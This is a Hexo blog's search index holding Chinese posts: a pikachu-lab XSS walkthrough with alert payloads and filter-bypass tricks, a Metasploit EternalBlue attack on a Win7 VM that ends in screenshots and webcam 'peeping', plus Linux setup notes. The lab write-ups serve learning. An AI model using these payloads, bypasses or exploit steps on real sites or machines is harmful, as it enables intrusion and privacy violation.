<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pikachu漏洞练习平台实验--XSS</title>
    <url>/2020/05/11/note-2/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
<li>XSS，实质是一种HTML，是一种发生在Web前端的漏洞，其可用于进行钓鱼攻击、前端js挖矿、盗取用户cookie，甚至对主机进行远程控制等等。而攻击流程，则类似于攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中，当用户访问这个页面时，这个恶意的JS代码就会在用户的浏览器端执行。</li>
<li>主要原因: 程序中输入和输出的控制不够严格<h4 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a>XSS攻击类型</h4></li>
<li>反射型: 又被称为非持久性、参数型XSS。常见的XSS攻击，恶意代码通常在URL地址的请求参数中，且交互的数据一般不会被存在数据库里面，一次性。</li>
<li>存储型: 又被称为持久型XSS，相比于反射型XSS，其危害性更大大大大大大，甚至可能危害Web服务器本身的安全。常见于评论区、留言，即交互的数据会被存在数据库里面，永久性存储（我慌了，你呢？）</li>
<li>DOM型: 基于文档对象模型的一种漏洞，是一种通过DOM操作前端代码输出的时候产生的问题，不与后台服务器产生数据交互，一次性，也属于反射型</li>
<li>危害: 存储型 &gt;&gt; 反射型 &gt; DOM型（等等，为啥有个远大于号？）<h4 id="一丢丢测试流程"><a href="#一丢丢测试流程" class="headerlink" title="一丢丢测试流程"></a>一丢丢测试流程</h4>（1）目标上找输入点，“见框就插”，比如查询接口、留言板啥的<br>（2）输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理<br>（3）构造闭合 -&gt; 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件<br>（4）提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行则说明存在XSS漏洞<br>以下是在pikachu（皮卡丘）漏洞平台瞎捣鼓的小实验，一起来搞啊</li>
</ul>
<hr>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>皮卡丘平台有很多（烤！面筋~）瞎说，有很多漏洞类型的实验，这次咱选<code>Cross-Site Scripting</code>进行<br>平台环境搭建可参考: <a href="https://cloud.tencent.com/developer/article/1590950" target="_blank" rel="noopener">pikachu</a> </p>
<h4 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h4><p>1）“上去就是见框就插”，先输入特殊字符看看会不会被过滤掉,试试输入&lt;&gt;’’””123啥的<br><img src="https://s1.ax1x.com/2020/05/11/YJKGkR.png" alt=""><br>2）看来是被过滤掉了，那通过查看页面源码可以发现，我们输入的内容到了p标签里面，接着试试用JS代码，看是否还是被过滤，payload可如下</p>
<pre><code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code></pre><p>3）但发现前端对输入做了长度限制，则需要在页面源码处找到maxlength修改一下，再次插入提交发现<br><img src="https://s1.ax1x.com/2020/05/11/YJQbOU.png" alt=""><br>成功弹窗了，在页面源码也可发现输入的payload嵌入了p标签且被正确执行<br><strong>这是个GET型XSS漏洞，将带有XSS的URL伪装后发送给目标，从前端输入，由后端接受再输出</strong></p>
<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><ul>
<li><strong>存储型XSS和反射型XSS形成原因是一样的，不同的则是存储型XSS下攻击者可以将脚本注入到后台存储起来，构成更加持久的危害（这就有点难顶了）</strong><br>1）我们先试试在平台给出的实验留言框中输入一下特殊字符，看看是否存在过滤，尝试后发现输入内容当作留言且直接输出了<br><img src="https://s1.ax1x.com/2020/05/11/YJjTdH.png" alt=""><br>2）只能查看页面源码，发现输入的东西被直接放在p标签了，没有经过任何转义处理，输入payload测试<pre><code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code></pre><img src="https://s1.ax1x.com/2020/05/11/YJvx91.png" alt=""><br>成功弹窗了，原理也是和反射型的差不多，只是这种XSS的持久危害性较大<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4>1）可以将DOM理解为访问HTML的标准接口，而DOM里面会把我们的HTML分成一个DOM树，以这棵树为入口，通过DOM的某些方法对树进行操作（增删改标签啥的），所以DOM也相当于在前端提供了一个<strong>通过JS去对HTML进行操作的接口</strong><br>2）而造成DOM型XSS的原因则是前端的输入被DOM给获取到了，通过DOM又在前端输出，跟反射型和存储型比起来，它是不经过后台交互的<br>3）等等？快进入正题，不能瞎扯<br>依然是老套路，上去先插一小段特殊字符提交一下，what do you see?又是跳转403，又是没反应的，决定观察页面源码，找到<strong>xssd_main</strong>部分<br><img src="https://s1.ax1x.com/2020/05/11/YYE39S.png" alt=""></li>
<li>这里有段JS代码，它通过 getElementById 获取标签 Id 为 text 的内容赋值给 str ，然后把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a 标签会写到 Id 为 dom 的 div 标签中（呼~~真是让人难顶的代码分析）<strong>通过闭合方式</strong>构造个payload试试吧，如下<pre><code>#' onclick=alert("看不见我看不见我")&gt;</code></pre>点击一下，我看见你啦φ(≧ω≦*)♪，成功弹窗<br><img src="https://s1.ax1x.com/2020/05/11/YYeogU.png" alt=""><h4 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h4>1）<strong>请说出宁的伤心往事？</strong>随缘输入一段内容，出现一可选项，click一下，又来一个，click第两下，啥？404了，莫得想法了，查看源码<br><img src="https://s1.ax1x.com/2020/05/11/YYuA9P.png" alt=""><br>2）又来到了分析时间（我拒绝，不是），看到<strong>xssd_main</strong>里面那段JS代码，一个domxss函数，利用<strong>window.location.search</strong>获取浏览器URL内容， 赋值到str，ok下面不会了，游戏结束<br>3）（港咩啊，查查呗）然后是经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss，最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中，<strong>来了划重点</strong>: 跟前面的DOM不同，它的输入是从浏览器的URL中获取的，就像反射型XSS(get)<br>4）<strong>通过闭合方式</strong>构造payload，比如<pre><code>#' onclick=alert("求求宁给俺弹个窗吧")&gt;</code></pre>口中默念，3、2、1、点火起飞（瞎说啥），成功弹窗了<br><img src="https://s1.ax1x.com/2020/05/11/YYM9JI.png" alt=""><h4 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h4>1）好的我们看到了个友情提问，我们来个友情回答，提交后，就这？<br><img src="https://s1.ax1x.com/2020/05/11/YYQ04s.png" alt=""><br>2）（真是让人摸不着头脑）想想看，我们输入的内容不在前端输出，应该是提交到了后端，那…要是输入一段JS代码，而且存在XSS漏洞，后端管理员登录后是不是会看到弹窗了？试试构造payload<pre><code>&lt;script&gt;alert("咯噔一下弹出来")&lt;/script&gt;</code></pre>3）因为是实验，咱们当一回管理员，登录后台管理界面看看，登录方法平台有提示，主要就是先进入<code>http://xxx.xxx.xxx.xxx/pikachu/vul/xss/xssblind/admin_login.php</code>（端口、文件名啥的根据实际情况改一下就可以进入了，然后根据提示的账号密码登录管理员）<br>4）（咯噔一下，弹窗了）这…谁顶得住啊<br><img src="https://s1.ax1x.com/2020/05/11/YYGllR.png" alt=""><h4 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h4>1）好的，又是一个友情提问，咱们来先插入特殊字符试试<br><img src="https://s1.ax1x.com/2020/05/12/YYbYbd.png" alt=""><br>2）<strong>无论面对什么困难，不要害怕，干！就好了，奥利干！</strong><br>3）尝试构造payload<code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code>，发现还是没弹窗，而且观察源码发现输入的<code>&lt;script&gt;</code>标签被过滤掉了<br><img src="https://s1.ax1x.com/2020/05/12/YYzdcq.png" alt=""><br>4）现在要尝试用其他思路注入JS了</li>
<li><strong>系统转换的思路</strong><ul>
<li><strong>大小写</strong>，比如<code>&lt;SCRIPT&gt;aLeRT(1)&lt;/sCRIpt&gt;</code>后台可能用正则表达式匹配，但如果正则里面只匹配小写，那就可能被绕过</li>
<li><strong>双写拼凑</strong>，比如<code>&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;</code>后台可能把<code>&lt;script&gt;</code>标签去掉，但可能只去掉一次</li>
<li><strong>注释干扰</strong>，比如<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(1)&lt;/sc&lt;!--test--&gt;ript&gt;</code>加上注释后可能可以绕过后台过滤机制</li>
</ul>
</li>
<li><strong>核心编码思路</strong><ul>
<li><strong>后台过滤了特殊字符</strong>，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码以致不被过滤。接着当浏览器对该编码进行识别时，<strong>会翻译成正常标签</strong>，从而执行</li>
<li>more and more</li>
</ul>
</li>
</ul>
<p>5）所以接下来尝试大小写混合的写法，看看能否绕过</p>
<pre><code>&lt;SCRIPT&gt;alert(1)&lt;/sCRIpt&gt;</code></pre><p>这时成功弹窗了，也说明后端只对小写的<strong>script</strong>进行过滤<br><img src="https://s1.ax1x.com/2020/05/12/YtiO2Q.png" alt=""></p>
<h4 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h4><p>1）就是这，开始没注意到<code>htmlspecialchars()</code>这个函数，查查 -&gt; <strong>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数</strong>，部分如下<br>| 预定义字符转换 | &amp; 转 &amp;amp | “ 转 &amp;quot | ‘ 转 &amp;#039 | &lt; 转 &amp;lt | &gt; 转 &amp;gt |<br>可用引号类型: <code>ENT_COMPAT默认，仅编码双引号</code>，<code>ENT_QUOTES，编码双引号和单引号</code>，<code>ENT_NOQUOTES，不编码任何引号</code><br>2）所以接下来进行猜测，如果输入<code>&lt;&gt;?&amp;"666</code>这些啥的可能会经过HTML编码，然后结合观察xssr_main部分的源码可发现单引号仍可用，所以选择<strong>单引号闭合方式</strong>构造payload</p>
<pre><code>' onclick=alert(123456) '</code></pre><p>3）提交后点击跳转，看见弹窗<br><img src="https://s1.ax1x.com/2020/05/13/YapPUK.png" alt=""></p>
<h4 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h4><p>1）开始需要我们输入一个常用网站，那就试试<code>www.baidu.com</code><br><img src="https://s1.ax1x.com/2020/05/13/Ya9hmn.png" alt=""> <img src="https://s1.ax1x.com/2020/05/13/YaPLZR.jpg" alt=""><br>2）（我不是，我没有，别瞎说啊）好的，下一步看看源码，发现似乎没啥特别，咱换种输入，比如输入<code>123456</code>，查看源码<br><img src="https://s1.ax1x.com/2020/05/13/YaFX8K.png" alt=""><br>3）输出出现在<strong>a标签的href属性</strong>里面，首先找到pikachu的XSS文件中这个实验文件<strong>xss_03.php</strong>，看看里面都有啥<br><img src="https://s1.ax1x.com/2020/05/13/YaAMOe.png" alt=""><br>4）<strong>分析</strong>，我们输入参数，会先经过判断，如果不是<code>www.baidu.com</code>，就会进行htmlspecialchars转义（ENT_QUOTES则是对单双引号都进行转义了），然后将我们的参数输出到<strong>a标签的href属性</strong>里面<br>5）输出出现在<strong>a标签的href属性</strong>里面，可使用javascript协议来执行js，可构造payload</p>
<pre><code>javascript:alert(123456)</code></pre><p>提交点击url，出现弹窗<br><img src="https://s1.ax1x.com/2020/05/13/YaVBin.png" alt=""></p>
<h4 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h4><p>1）尝试除了<strong>tmac</strong>，输入其他的基本都显示同一句话，查看页面源码看到p标签好像有个小提示-&gt;<strong>id=”fromjs”</strong>，尝试打开原题文件<strong>xss_04.php</strong>查看<br><img src="https://s1.ax1x.com/2020/05/13/YaeoDO.png" alt=""><br>2）<strong>分析</strong>，我们输入的会被放到JS中，然后经过判断，输出<br>3）<strong>通过闭合方式</strong>构造payload，先用<code>一个单引号和&lt;/script&gt;</code>闭合掉页面开头的<code>&lt;script&gt;</code>，然后插入一段要注入的JS代码，如下</p>
<pre><code>'&lt;/script&gt;&lt;script&gt;alert("执行一下就弹窗")&lt;/script&gt;</code></pre><p>提交后我们的JS也被执行了，出现弹窗<br><img src="https://s1.ax1x.com/2020/05/13/YautED.png" alt=""></p>
<ul>
<li>（总结）<strong>漏洞的输出点是在JS中</strong>，通过用户的输入动态生成了JS代码；而<strong>JS有个特点，它不会对实体编码进行解释</strong>，所以这里如果进行html的实体编码,虽然可以解决XSS的问题,但是<strong>实体编码后的内容,在JS里面不会进行翻译</strong>,这样会导致前端的功能无法使用，所以应在JS的输出点使用<code>\</code>对特殊字符进行转义<h4 id="剩个反射型post，下次一定（以后补充）"><a href="#剩个反射型post，下次一定（以后补充）" class="headerlink" title="剩个反射型post，下次一定（以后补充）"></a>剩个反射型post，下次一定（以后补充）</h4><img src="https://s1.ax1x.com/2020/05/12/YNViVA.jpg" alt=""></li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/04/02/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
  </entry>
  <entry>
    <title>第一次攻击实验</title>
    <url>/2020/04/15/ok/</url>
    <content><![CDATA[<p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <tags>
        <tag>experiment</tag>
      </tags>
  </entry>
  <entry>
    <title>note_1</title>
    <url>/2020/04/27/note-1/</url>
    <content><![CDATA[<h3 id="Linux系统搭建配置-1-软件入门（真-·-水文章）"><a href="#Linux系统搭建配置-1-软件入门（真-·-水文章）" class="headerlink" title="Linux系统搭建配置 1.. 软件入门（真 · 水文章）"></a>Linux系统搭建配置 1.. 软件入门（真 · 水文章）</h3><p>（以Ubuntu为例）</p>
<h4 id="搭建SSH服务"><a href="#搭建SSH服务" class="headerlink" title="搭建SSH服务"></a>搭建SSH服务</h4><h6 id="1、安装ssh服务"><a href="#1、安装ssh服务" class="headerlink" title="1、安装ssh服务"></a>1、安装ssh服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">ssh</span></code></pre>
<h6 id="2、启动-停止-查看服务"><a href="#2、启动-停止-查看服务" class="headerlink" title="2、启动/停止/查看服务"></a>2、启动/停止/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> <span class="token function">ssh</span> start/stop/status</code></pre>
<h6 id="3、配置ssh服务"><a href="#3、配置ssh服务" class="headerlink" title="3、配置ssh服务"></a>3、配置ssh服务</h6><p>/etc/ssh/sshd_config<br><strong><em>一般使用环境</em></strong></p>
<ul>
<li>不允许root登录</li>
<li>只允许证书方式登录</li>
<li>更改ssh端口</li>
</ul>
<hr>
<h4 id="搭建apache服务"><a href="#搭建apache服务" class="headerlink" title="搭建apache服务"></a>搭建apache服务</h4><h6 id="1、安装apache服务"><a href="#1、安装apache服务" class="headerlink" title="1、安装apache服务"></a>1、安装apache服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> apache2</code></pre>
<h6 id="2、启动-停止-查看服务-1"><a href="#2、启动-停止-查看服务-1" class="headerlink" title="2、启动/停止/查看服务"></a>2、启动/停止/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> apache2 start/stop/status</code></pre>
<h6 id="3、配置apache服务"><a href="#3、配置apache服务" class="headerlink" title="3、配置apache服务"></a>3、配置apache服务</h6><ul>
<li>/etc/apache2/apache2.conf（主配置文件）</li>
<li>/etc/apache2/conf-*（其余配置文件）</li>
<li>/etc/apache2/sites-*（虚拟主机配置文件）</li>
</ul>
<p><strong><em>常用命令</em></strong></p>
<pre class=" language-bash"><code class="language-bash">$ a2 + disconf/dismod/dissite/enconf/enmod/ensite/<span class="token punctuation">..</span>.</code></pre>
<hr>
<h4 id="搭建mysql服务"><a href="#搭建mysql服务" class="headerlink" title="搭建mysql服务"></a>搭建mysql服务</h4><h6 id="1、安装mysql"><a href="#1、安装mysql" class="headerlink" title="1、安装mysql"></a>1、安装mysql</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> mysql-server mysql-client</code></pre>
<h6 id="2、启动-暂停-查看服务"><a href="#2、启动-暂停-查看服务" class="headerlink" title="2、启动/暂停/查看服务"></a>2、启动/暂停/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> mysql start/stop/status</code></pre>
<h6 id="3、配置mysql服务"><a href="#3、配置mysql服务" class="headerlink" title="3、配置mysql服务"></a>3、配置mysql服务</h6><ul>
<li>/etc/mysql/mysql.conf.d/mysqld.cnf（配置文件）</li>
<li>常用配置项 -&gt; bind-address（设置mysql请求的ip）</li>
</ul>
<h6 id="4、进入mysql命令行模式"><a href="#4、进入mysql命令行模式" class="headerlink" title="4、进入mysql命令行模式"></a>4、进入mysql命令行模式</h6><pre class=" language-bash"><code class="language-bash">$ musql -u 用户名 -p</code></pre>
<hr>
<h4 id="Docker（镜像-容器-仓库）"><a href="#Docker（镜像-容器-仓库）" class="headerlink" title="Docker（镜像+容器+仓库）"></a>Docker（镜像+容器+仓库）</h4><h6 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h6><p><strong><em>具体指令可直接网上查找</em></strong><br>此处用的是kali系统下安装，可参考下帖（表示很喜欢里面的仓鼠）<br>More: <a href="https://www.cnblogs.com/L0ading/p/12312413.html" target="_blank" rel="noopener">https://www.cnblogs.com/L0ading/p/12312413.html</a></p>
<h6 id="2、启动-暂停-查看服务-1"><a href="#2、启动-暂停-查看服务-1" class="headerlink" title="2、启动/暂停/查看服务"></a>2、启动/暂停/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> docker start/stop/status</code></pre>
<h6 id="3、Docker跑起？"><a href="#3、Docker跑起？" class="headerlink" title="3、Docker跑起？"></a>3、Docker跑起？</h6><pre class=" language-bash"><code class="language-bash">$ docker run --itd --name myname -p 8080:80 ubuntu</code></pre>
<ul>
<li>-it    给予一个交互式操作终端</li>
<li>-d     后台运行</li>
<li>–name 容器名称</li>
<li>-p     端口映射</li>
</ul>
<h6 id="4、进入docker命令行模式"><a href="#4、进入docker命令行模式" class="headerlink" title="4、进入docker命令行模式"></a>4、进入docker命令行模式</h6><pre class=" language-bash"><code class="language-bash">$ docker <span class="token function">exec</span> -it myname <span class="token function">pwd</span></code></pre>
<ul>
<li>-it    给予一个交互式终端执行命令</li>
</ul>
<p><strong>（到时再补补细节，估计又双叒叕要拖一下下了）</strong></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
